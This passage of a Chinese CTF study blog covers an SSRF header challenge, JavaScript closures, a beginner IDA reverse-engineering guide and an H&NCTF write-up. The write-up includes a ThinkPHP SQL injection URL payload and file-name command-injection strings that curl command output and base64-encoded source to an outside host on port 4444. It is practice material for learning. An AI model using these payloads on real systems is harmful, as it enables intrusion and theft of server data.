class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span> = <span class="string">&#x27;http://back-end:3000/flag?&#x27;</span>;</span><br><span class="line"><span class="variable">$input</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);  </span><br><span class="line"><span class="variable">$headers</span> = (<span class="keyword">array</span>)<span class="title function_ invoke__">json_decode</span>(<span class="variable">$input</span>)-&gt;headers;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">count</span>(<span class="variable">$headers</span>); <span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="variable">$offset</span> = <span class="title function_ invoke__">stripos</span>(<span class="variable">$headers</span>[<span class="variable">$i</span>], <span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">    <span class="variable">$key</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$headers</span>[<span class="variable">$i</span>], <span class="number">0</span>, <span class="variable">$offset</span>);</span><br><span class="line">    <span class="variable">$value</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$headers</span>[<span class="variable">$i</span>], <span class="variable">$offset</span> + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$key</span>, <span class="string">&#x27;admin&#x27;</span>) &gt; -<span class="number">1</span> &amp;&amp; <span class="title function_ invoke__">stripos</span>(<span class="variable">$value</span>, <span class="string">&#x27;true&#x27;</span>) &gt; -<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;try hard&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$params</span> = (<span class="keyword">array</span>)<span class="title function_ invoke__">json_decode</span>(<span class="variable">$input</span>)-&gt;params;</span><br><span class="line"><span class="variable">$url</span> .= <span class="title function_ invoke__">http_build_query</span>(<span class="variable">$params</span>);</span><br><span class="line"><span class="variable">$url</span> .= <span class="string">&#x27;&amp;admin=false&#x27;</span>;</span><br><span class="line"><span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HTTPHEADER, <span class="variable">$headers</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_TIMEOUT_MS, <span class="number">5000</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_NOBODY, <span class="literal">FALSE</span>);</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line"><span class="keyword">try</span> hard1</span><br><span class="line"></span><br><span class="line">js代码</span><br><span class="line">app.<span class="title function_ invoke__">get</span>(<span class="string">&#x27;/flag&#x27;</span>, (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span>(!req.query.admin.<span class="title function_ invoke__">includes</span>(<span class="string">&#x27;false&#x27;</span>) &amp;&amp; req.headers.admin.<span class="title function_ invoke__">includes</span>(<span class="string">&#x27;true&#x27;</span>))&#123;</span><br><span class="line">        res.<span class="title function_ invoke__">send</span>(flag);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        res.<span class="title function_ invoke__">send</span>(<span class="string">&#x27;try hard&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="wife-wife"><a href="#wife-wife" class="headerlink" title="wife_wife"></a>wife_wife</h3><p>前置知识：</p><p>假设在函数内部新建了一个变量，函数执行完毕之后，函数内部这个独立作用域或（封闭的盒子）就会删除，此时这个新建变量也会被删除。</p><p>如何令这个封闭的盒子是不会删除？可以使用“闭包”的方法（闭包涉及函数作用域、内存回收机制、作用域继承）</p><p>闭包后，内部函数可以访问外部函数作用域的变量，而外部的函数不能直接获取到内部函数的作用域变量</p><p>js闭包理解：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> add = (<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> counter = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;<span class="keyword">return</span> counter += <span class="number">1</span>;&#125;</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 奶奶的“记忆助手”  </span></span><br><span class="line"><span class="keyword">var</span> 奶奶的记忆助手 = (<span class="keyword">function</span>(<span class="params"></span>) &#123;  </span><br><span class="line">    <span class="comment">// 初始时，奶奶还没有收集任何石头  </span></span><br><span class="line">    <span class="keyword">var</span> 奶奶已经收集的石头数量 = <span class="number">0</span>;  </span><br><span class="line"></span><br><span class="line">    <span class="comment">// 这是一个按钮，奶奶每次找到一块石头都会按这个按钮  </span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">function</span>(<span class="params"></span>) &#123;  </span><br><span class="line">        <span class="comment">// 每按一次，奶奶已经收集的石头数量就加1  </span></span><br><span class="line">        奶奶已经收集的石头数量 += <span class="number">1</span>; </span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 然后告诉奶奶她现在有多少块石头  </span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> 奶奶已经收集的石头数量;  </span><br><span class="line">    &#125;;  </span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>初识re</title>
      <link href="/2024/05/20/%E5%88%9D%E8%AF%86re/"/>
      <url>/2024/05/20/%E5%88%9D%E8%AF%86re/</url>
      
        <content type="html"><![CDATA[<p>BUUCTF reverse1</p><p>学习要领：<br>1.使用IDA打开文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.点击New打开新文件</span><br><span class="line">2.点击Go,把可执行文件拖进IDA</span><br><span class="line">注：不同版本要用对应的32或64位打开，可以尝试，因为它要么32位，要么64位</span><br></pre></td></tr></table></figure><p>2.IDA窗口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">01.反汇编窗口</span><br><span class="line">  是图形化界面，一般可以通过这个界面快速了解程序的执行过程</span><br><span class="line">02.字符串窗口</span><br><span class="line">  使用shift+F12打开，打开字符串窗口，可以看到里面的字符串</span><br></pre></td></tr></table></figure><p><img src="/2024/05/20/%E5%88%9D%E8%AF%86re/Users\史小乐\AppData\Roaming\Typora\typora-user-images\image-20240520165302704.png" alt="image-20240520165302704"></p><p>3.反编译</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在反汇编窗口使用fn+F5实现反汇编功能，即将汇编语言反向编译为伪C语言</span><br></pre></td></tr></table></figure><p>现在看题：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.打开exe文件</span><br><span class="line">2.shift+F12查看字符串</span><br><span class="line">3.跟进，双击“this is the right flag”,发现右下角有DATA XREF，它的地址，点击进入，看到流程图</span><br></pre></td></tr></table></figure><p><img src="/2024/05/20/%E5%88%9D%E8%AF%86re/Users\史小乐\AppData\Roaming\Typora\typora-user-images\image-20240520171559490.png" alt="image-20240520171559490"></p><p><img src="/2024/05/20/%E5%88%9D%E8%AF%86re/Users\史小乐\AppData\Roaming\Typora\typora-user-images\image-20240520171757295.png" alt="image-20240520171757295"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4.fn+F5,反汇编，得到伪C语言，进行审计代码</span><br></pre></td></tr></table></figure><p><img src="/2024/05/20/%E5%88%9D%E8%AF%86re/Users\史小乐\AppData\Roaming\Typora\typora-user-images\image-20240520172204541.png" alt="image-20240520172204541"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>H&amp;NCTF复现</title>
      <link href="/2024/05/19/H-NCTF%E5%A4%8D%E7%8E%B0/"/>
      <url>/2024/05/19/H-NCTF%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h4 id="ez-tp"><a href="#ez-tp" class="headerlink" title="ez_tp"></a>ez_tp</h4><p>有点没理解，以后有能力了再做做吧</p><p>在原版thinkphp3.2.3中，删除了think_filter过滤的exp，使得我们可以利用</p><p>在ThinkPHP\Library\Think\Db\Driver.class.php中的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if(is_array($val)) &#123;</span><br><span class="line">...</span><br><span class="line">elseif(&#x27;exp&#x27; == $exp )&#123;</span><br><span class="line">$whereStr .= $key.&#x27; &#x27;.$val[1];</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用exp时，需要手动添加等号，再配合union select，即可获得flag</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php/home/index/h_n?name[0]=exp&amp;name[1]=%3d%27test123%27%20union%20select%201,flag%20from%20flag</span><br></pre></td></tr></table></figure><p>注意，cookie可能会匹配某些过滤，删除即可</p><p><img src="/2024/05/19/H-NCTF%E5%A4%8D%E7%8E%B0/Users\史小乐\AppData\Local\Temp\AgAABbWKMDsWNdOkNjhBh7wNdbPFULoV.png" alt="AgAABbWKMDsWNdOkNjhBh7wNdbPFULoV"></p><h2 id><a href="#" class="headerlink" title></a></h2><h4 id="GoJava"><a href="#GoJava" class="headerlink" title="GoJava"></a>GoJava</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">题面</span><br><span class="line">moran 凭借自己一坤天的代码学习，写了一个简单的在线 java 编译器，快来试试吧！</span><br><span class="line">tips:编译需要时间，请耐心等待</span><br><span class="line">flag在/root里。另外请细心寻找</span><br></pre></td></tr></table></figure><p>1.信息泄露了两个文件:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">robots.txt</span><br><span class="line">js</span><br></pre></td></tr></table></figure><p>访问robots.txt</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: ./main-old.zip  可以看</span><br><span class="line"></span><br><span class="line">User-agent: *</span><br><span class="line">Disallow: ./main.go  看不了，被ban了</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">&quot;io&quot;</span><br><span class="line">&quot;log&quot;</span><br><span class="line">&quot;mime/multipart&quot;</span><br><span class="line">&quot;net/http&quot;</span><br><span class="line">&quot;os&quot;</span><br><span class="line">&quot;strings&quot;</span><br><span class="line">)</span><br><span class="line">var blacklistChars = []rune&#123;&#x27;&lt;&#x27;, &#x27;&gt;&#x27;, &#x27;&quot;&#x27;, &#x27;\&#x27;&#x27;, &#x27;\\&#x27;, &#x27;?&#x27;, &#x27;*&#x27;, &#x27;&#123;&#x27;, &#x27;&#125;&#x27;, &#x27;\t&#x27;, &#x27;\n&#x27;, &#x27;\r&#x27;&#125;</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">// 设置路由</span><br><span class="line">http.HandleFunc(&quot;/gojava&quot;, compileJava)</span><br><span class="line"></span><br><span class="line">// 设置静态文件服务器</span><br><span class="line">fs := http.FileServer(http.Dir(&quot;.&quot;))</span><br><span class="line">http.Handle(&quot;/&quot;, fs)</span><br><span class="line"></span><br><span class="line">// 启动服务器</span><br><span class="line">log.Println(&quot;Server started on :80&quot;)</span><br><span class="line">log.Fatal(http.ListenAndServe(&quot;:80&quot;, nil))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func isFilenameBlacklisted(filename string) bool &#123;</span><br><span class="line">for _, char := range filename &#123;</span><br><span class="line">for _, blackChar := range blacklistChars &#123;</span><br><span class="line">if char == blackChar &#123;</span><br><span class="line">return true</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return false</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func compileJava(w http.ResponseWriter, r *http.Request) &#123;</span><br><span class="line">// 检查请求方法是否为POST</span><br><span class="line">if r.Method != http.MethodPost &#123;</span><br><span class="line">http.Error(w, &quot;Method not allowed&quot;, http.StatusMethodNotAllowed)</span><br><span class="line">return</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 解析multipart/form-data格式的表单数据</span><br><span class="line">err := r.ParseMultipartForm(10 &lt;&lt; 20) // 设置最大文件大小为10MB</span><br><span class="line">if err != nil &#123;</span><br><span class="line">http.Error(w, &quot;Error parsing form&quot;, http.StatusInternalServerError)</span><br><span class="line">return</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 从表单中获取上传的文件</span><br><span class="line">file, handler, err := r.FormFile(&quot;file&quot;)</span><br><span class="line">if err != nil &#123;</span><br><span class="line">http.Error(w, &quot;Error retrieving file&quot;, http.StatusBadRequest)</span><br><span class="line">return</span><br><span class="line">&#125;</span><br><span class="line">defer file.Close()</span><br><span class="line"></span><br><span class="line">if isFilenameBlacklisted(handler.Filename) &#123;</span><br><span class="line">http.Error(w, &quot;Invalid filename: contains blacklisted character&quot;, http.StatusBadRequest)</span><br><span class="line">return</span><br><span class="line">&#125;</span><br><span class="line">if !strings.HasSuffix(handler.Filename, &quot;.java&quot;) &#123;</span><br><span class="line">http.Error(w, &quot;Invalid file format, please select a .java file&quot;, http.StatusBadRequest)</span><br><span class="line">return</span><br><span class="line">&#125;</span><br><span class="line">err = saveFile(file, &quot;./upload/&quot;+handler.Filename)</span><br><span class="line">if err != nil &#123;</span><br><span class="line">http.Error(w, &quot;Error saving file&quot;, http.StatusInternalServerError)</span><br><span class="line">return</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func saveFile(file multipart.File, filePath string) error &#123;</span><br><span class="line">// 创建目标文件</span><br><span class="line">f, err := os.Create(filePath)</span><br><span class="line">if err != nil &#123;</span><br><span class="line">return err</span><br><span class="line">&#125;</span><br><span class="line">defer f.Close()</span><br><span class="line"></span><br><span class="line">// 将上传的文件内容复制到目标文件中</span><br><span class="line">_, err = io.Copy(f, file)</span><br><span class="line">if err != nil &#123;</span><br><span class="line">return err</span><br><span class="line">&#125;</span><br><span class="line">return nil</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到对上传的文件名是有过滤的，我们可以尝试用文件名进行RCE</p><p>但是我没弹过来😿🥹🥹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">------WebKitFormBoundaryujTPRyD0Ol0dP4y8</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;a.java||curl -X POST -d a=`whoami` [IP]:4444||.java&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line">1</span><br><span class="line">------WebKitFormBoundaryujTPRyD0Ol0dP4y8--</span><br><span class="line">看文件夹</span><br><span class="line">a.java||curl -X POST -d a=`ls|base64 -w 0` [IP]:4444||.java</span><br><span class="line"></span><br><span class="line">Y3NzCmZpbmFsCmdvLm1vZApnb2phdmEKaW5kZXguaHRtbApqcwptYWluLW9sZC56aXAKbWFpbi5nbwpyb2JvdHMudHh0CnVwbG9hZAo=</span><br><span class="line"> 解码得到</span><br><span class="line">css</span><br><span class="line">final</span><br><span class="line">go.mod</span><br><span class="line">gojava</span><br><span class="line">index.html</span><br><span class="line">js</span><br><span class="line">main-old.zip</span><br><span class="line">main.go</span><br><span class="line">robots.txt</span><br><span class="line">upload</span><br><span class="line"></span><br><span class="line">拿一下main.go</span><br><span class="line">a.java||curl -X POST -d a=`base64 -w 0 main.go` [IP]:4444||.java</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br></pre></td><td class="code"><pre><span class="line">import (</span><br><span class="line">    &quot;fmt&quot;</span><br><span class="line">    &quot;io&quot;</span><br><span class="line">    &quot;log&quot;</span><br><span class="line">    &quot;math/rand&quot;</span><br><span class="line">    &quot;mime/multipart&quot;</span><br><span class="line">    &quot;net/http&quot;</span><br><span class="line">    &quot;os&quot;</span><br><span class="line">    &quot;os/exec&quot;</span><br><span class="line">    &quot;path/filepath&quot;</span><br><span class="line">    &quot;strconv&quot;</span><br><span class="line">    &quot;strings&quot;</span><br><span class="line">    &quot;time&quot;</span><br><span class="line">)</span><br><span class="line"> </span><br><span class="line">var blacklistChars = []rune&#123;&#x27;&lt;&#x27;, &#x27;&gt;&#x27;, &#x27;&quot;&#x27;, &#x27;\&#x27;&#x27;, &#x27;\\&#x27;, &#x27;?&#x27;, &#x27;*&#x27;, &#x27;&#123;&#x27;, &#x27;&#125;&#x27;, &#x27;\t&#x27;, &#x27;\n&#x27;, &#x27;\r&#x27;&#125;</span><br><span class="line"> </span><br><span class="line">func main() &#123;</span><br><span class="line">    // 设置路由</span><br><span class="line">    http.HandleFunc(&quot;/gojava&quot;, compileJava)</span><br><span class="line">    http.HandleFunc(&quot;/testExecYourJarOnServer&quot;, testExecYourJarOnServer)</span><br><span class="line"> </span><br><span class="line">    // 设置静态文件服务器</span><br><span class="line">    fs := http.FileServer(http.Dir(&quot;.&quot;))</span><br><span class="line">    http.Handle(&quot;/&quot;, http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) &#123;</span><br><span class="line">        // 检查请求的路径是否需要被禁止访问</span><br><span class="line">        if isForbiddenPath(r.URL.Path) &#123;</span><br><span class="line">            http.Error(w, &quot;Forbidden&quot;, http.StatusForbidden)</span><br><span class="line">            return</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        // 否则，继续处理其他请求</span><br><span class="line">        fs.ServeHTTP(w, r)</span><br><span class="line">    &#125;))</span><br><span class="line"> </span><br><span class="line">    // 启动服务器</span><br><span class="line">    log.Println(&quot;Server started on :80&quot;)</span><br><span class="line">    log.Fatal(http.ListenAndServe(&quot;:80&quot;, nil))</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">func isForbiddenPath(path string) bool &#123;</span><br><span class="line">    // 检查路径是否为某个特定文件或文件夹的路径</span><br><span class="line">    // 这里可以根据你的需求进行设置</span><br><span class="line">    forbiddenPaths := []string&#123;</span><br><span class="line">        &quot;/main.go&quot;,</span><br><span class="line">        &quot;/upload/&quot;,</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    // 检查请求的路径是否与禁止访问的路径匹配</span><br><span class="line">    for _, forbiddenPath := range forbiddenPaths &#123;</span><br><span class="line">        if strings.HasPrefix(path, forbiddenPath) &#123;</span><br><span class="line">            return true</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    return false</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">func isFilenameBlacklisted(filename string) bool &#123;</span><br><span class="line">    for _, char := range filename &#123;</span><br><span class="line">        for _, blackChar := range blacklistChars &#123;</span><br><span class="line">            if char == blackChar &#123;</span><br><span class="line">                return true</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return false</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">// compileJava 处理上传并编译Java文件的请求</span><br><span class="line">func compileJava(w http.ResponseWriter, r *http.Request) &#123;</span><br><span class="line">    // 检查请求方法是否为POST</span><br><span class="line">    if r.Method != http.MethodPost &#123;</span><br><span class="line">        http.Error(w, &quot;Method not allowed&quot;, http.StatusMethodNotAllowed)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    // 解析multipart/form-data格式的表单数据</span><br><span class="line">    err := r.ParseMultipartForm(10 &lt;&lt; 20) // 设置最大文件大小为10MB</span><br><span class="line">    if err != nil &#123;</span><br><span class="line">        http.Error(w, &quot;Error parsing form&quot;, http.StatusInternalServerError)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    // 从表单中获取上传的文件</span><br><span class="line">    file, handler, err := r.FormFile(&quot;file&quot;)</span><br><span class="line">    if err != nil &#123;</span><br><span class="line">        http.Error(w, &quot;Error retrieving file&quot;, http.StatusBadRequest)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line">    defer file.Close()</span><br><span class="line"> </span><br><span class="line">    if isFilenameBlacklisted(handler.Filename) &#123;</span><br><span class="line">        http.Error(w, &quot;Invalid filename: contains blacklisted character&quot;, http.StatusBadRequest)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    // 检查文件扩展名是否为.java</span><br><span class="line">    if !strings.HasSuffix(handler.Filename, &quot;.java&quot;) &#123;</span><br><span class="line">        http.Error(w, &quot;Invalid file format, please select a .java file&quot;, 